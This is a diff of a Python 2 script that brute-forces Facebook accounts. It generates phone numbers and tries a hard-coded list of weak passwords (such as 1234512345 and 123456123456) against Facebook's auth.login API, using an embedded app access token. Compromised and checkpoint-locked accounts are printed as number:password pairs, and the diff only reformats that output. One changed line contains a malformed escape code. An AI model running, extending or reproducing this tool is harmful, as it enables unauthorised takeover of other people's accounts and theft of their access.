@@ -139,41 +139,41 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass1
+                print '\033[1;32;40m' + k + c + user + ':' + pass1
             elif 'www.facebook.com' in q['error_msg']:
-                print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass1
+                print '\033[31m' + k + c + user + ':' + pass1
             else:
                 pass2 = "1234512345"
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                   print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass2
+                   print '\033[1;32;40m' + k + c + user + ':' + pass2
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass2
+                    print '\033[31m' + k + c + user + ':' + pass2
                 else:
                     pass3 = "123456123456"
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass3
+                        print '\033[1;32;40m' + k + c + user + ':' + pass3
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass3
+                        print '\033[31m' + k + c + user + ':' + pass3
                     else:
                         pass4= "1122334455"
                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass4
+                            print '\033[1;32;40m' + k + c + user + ':' + pass4
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass4
+                            print '\033[31m' + k + c + user + ':' + pass4
                         else:
                             pass5= "123454321"
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\033[1;32;40m[OK]\033[0m Number: ' + k + c + user + ' PASS: ' + pass5
+                                print '\03[31;32;40m' + k + c + user + ':' + pass5
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '[\033[31mCP\033[0;1m] Number: ' + k + c + user + ' PASS: ' + pass5
+                                print '\033[31m' + k + c + user + ':' + pass5
         except:
             pass
 
